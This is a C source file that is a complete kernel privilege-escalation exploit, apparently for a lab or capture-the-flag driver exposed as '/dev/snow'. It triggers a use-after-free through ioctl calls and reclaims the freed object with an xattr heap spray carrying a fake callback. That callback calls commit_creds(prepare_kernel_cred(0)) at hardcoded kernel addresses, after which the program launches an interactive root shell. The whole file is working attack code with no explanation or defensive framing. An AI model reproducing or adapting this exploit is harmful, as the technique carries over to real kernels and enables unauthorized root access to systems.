#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/xattr.h>
#include <sys/ioctl.h>
#include <stdbool.h>
#include <time.h>

#define MMAP_SZ             0x2000
#define PAYLOAD_SZ          0x400
#define MAX_FILES           100      // 最大临时文件数
#define ATTRS_PER_FILE      3      // 每个文件的属性数
#define SNOW_ACT_NONE       0x40000
#define SNOW_ACT_ALLOC      0x40001
#define SNOW_ACT_CALLBACK   0x40002
#define SNOW_ACT_FREE       0x40003
#define SNOW_ACT_RESET      0x40004

/* ============================== Kernel stuff ============================== */

/* Addresses from System.map (no KASLR) */
#define COMMIT_CREDS_PTR           0xffffffff8108c760lu
#define PREPARE_KERNEL_CRED_PTR    0xffffffff8108c990lu

typedef int __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);

_commit_creds commit_creds = (_commit_creds)COMMIT_CREDS_PTR;
_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED_PTR;

void __attribute__((regparm(3))) root_it(unsigned long arg1, bool arg2)
{
    commit_creds(prepare_kernel_cred(0));
}

struct snow_item_t {
    u_int32_t foo;
    void (*callback)(void);
    char bar[1];
};

/* ========================================================================== */

void run_sh(void)
{
    pid_t pid = -1;
    char *args[] = {
        "/bin/sh",
        "-i",
        NULL
    };
    int status = 0;

    pid = fork();

    if (pid < 0) {
        perror("[-] fork()");
        return;
    }

    if (pid == 0) {
        execve("/bin/sh", args, NULL);
        perror("[-] execve");
        exit(EXIT_FAILURE);
    }

    if (wait(&status) < 0)
        perror("[-] wait");
}

void init_payload(char *p, size_t size)
{
    struct snow_item_t *item = (struct snow_item_t *)p;

    memset(p, 0x41, size);

    item->callback = (void (*)(void))root_it;

    printf("[+] payload:\n");
    printf("\tstart at %p\n", p);
    printf("\tcallback at %p\n", &item->callback);
    printf("\tcallback %lx\n", (unsigned long)item->callback);
}

// 创建临时文件并设置xattr
int spray_with_multifile(const char *base_path, const char *data, size_t size)
{
    char filename[64];
    int ret = 0;
    
    for (int i = 0; i < MAX_FILES; i++) {
        // 创建唯一临时文件名
        snprintf(filename, sizeof(filename), "%s.%d", base_path, i);
        int fd = open(filename, O_CREAT | O_RDWR, 0600);
        if (fd < 0) {
            perror("[-] create temp file failed");
            return -1;
        }
        close(fd);

        // 在每个文件上设置多个属性
        for (int j = 0; j < ATTRS_PER_FILE; j++) {
            char attr[32];
            snprintf(attr, sizeof(attr), "user.%d", j);
            if (setxattr(filename, attr, data, size, 0) < 0) {
                perror("[-] setxattr failed");
                unlink(filename); // 删除失败的文件
                return -1;
            }
        }
        
        printf("[+] sprayed %d attributes to %s\n", ATTRS_PER_FILE, filename);
        usleep(10000); // 10ms延迟减轻系统压力
    }
    
    return 0;
}

// 清理临时文件
void cleanup_files(const char *base_path)
{
    char filename[64];
    
    for (int i = 0; i < MAX_FILES; i++) {
        snprintf(filename, sizeof(filename), "%s.%d", base_path, i);
        unlink(filename);
    }
}

int main(void)
{
    unsigned char *spray_data = NULL;
    int ret = EXIT_FAILURE;
    int fd = -1;
    char base_file[] = "./foobar_XXXXXX"; // 模板用于mkstemp

    printf("begin as: uid=%d, euid=%d\n", getuid(), geteuid());

    // 创建唯一基础文件名
    if (mkstemp(base_file) < 0) {
        perror("[-] mkstemp failed");
        goto end;
    }
    unlink(base_file); // 我们只需要模板名称

    spray_data = mmap(NULL, MMAP_SZ, PROT_READ | PROT_WRITE,
                    MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (spray_data == MAP_FAILED) {
        perror("[-] mmap");
        goto end;
    }

    init_payload(spray_data, MMAP_SZ);

    fd = open("/dev/snow", O_RDWR);
    if (fd < 0) {
        perror("[-] open /dev/snow failed");
        goto end;
    }

    /* 分配内核对象 */
    if (ioctl(fd, SNOW_ACT_ALLOC, NULL) < 0) {
        perror("[-] ioctl SNOW_ACT_ALLOC failed");
        goto end;
    }

    /* 释放内核对象 */
    if (ioctl(fd, SNOW_ACT_FREE, NULL) < 0) {
        perror("[-] ioctl SNOW_ACT_FREE failed");
        goto end;
    }

    /* 使用多文件分散xattr负载 */
    if (spray_with_multifile(base_file, spray_data, PAYLOAD_SZ) < 0) {
        goto end;
    }

    /* 触发回调函数执行 */
    if (ioctl(fd, SNOW_ACT_CALLBACK, NULL) < 0) {
        perror("[-] ioctl SNOW_ACT_CALLBACK failed");
        goto end;
    }

    if (getuid() == 0 && geteuid() == 0) {
        printf("[+] finish as: uid=0, euid=0, start sh...\n");
        run_sh();
        ret = EXIT_SUCCESS;
    } else {
        printf("[-] privilege escalation failed\n");
    }

end:
    if (fd >= 0) close(fd);
    if (spray_data != MAP_FAILED) munmap(spray_data, MMAP_SZ);
    cleanup_files(base_file);

    printf("[+] The End\n");
    return ret;
}